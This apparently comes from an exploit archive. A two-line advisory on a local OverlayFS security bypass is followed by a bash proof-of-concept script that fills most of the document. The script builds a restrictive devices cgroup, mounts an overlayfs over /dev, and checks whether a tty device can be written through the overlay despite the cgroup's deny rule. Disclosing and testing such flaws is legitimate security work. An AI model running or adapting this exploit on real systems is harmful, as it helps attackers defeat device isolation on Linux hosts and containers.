source: http://www.securityfocus.com/bid/51529/info

OverlayFS is prone to a local security-bypass vulnerability.

Attackers can exploit this issue to bypass security restrictions and perform unauthorized actions. 

#!/bin/bash

ddir=`cat /proc/self/mountinfo | grep cgroup | grep devices | awk '{ print $5 }'`
if [ "x$ddir" = "x" ]; then
 echo "couldn't find devices cgroup mountpoint"
 exit 1
fi

# create new cgroup
ndir=`mktemp -d --tmpdir=$ddir exploit-XXXX`

# create a directory onto which we mount the overlay
odir=`mktemp -d --tmpdir=/mnt exploit-XXXX`

# create the directory to be the overlay dir (where changes
# will be written)
udir=`mktemp -d --tmpdir=/tmp exploit-XXX`

mount -t overlayfs -oupperdir=$udir,lowerdir=/dev none $odir
echo $$ > $ndir/tasks
# deny all device actions
echo a > $ndir/devices.deny
# but allow mknod of tty7, bc we have to mknod it in the writeable
# overlay
echo "c 4:5 m" > $ndir/devices.allow
echo "devices.list: XXXXXXXXXXXXXXX"
cat $ndir/devices.list
echo "XXXXXXXXXXXX"

# try writing to /dev/tty5 - not allowed
echo x > /dev/tty5
echo "write to /dev/tty5 returned $?"

# try writing to tty5 on the overlayfs - SHOULD not be allowed
echo y > $odir/tty5
echo "write to $odir/tty5 returned $?"

umount $odir
rmdir $odir
rm -rf $udir

# move ourselves back to root cgroup (else we can't delete the temp one
# bc it's occupied - by us)
echo $$ > $ddir/tasks
rmdir $ndir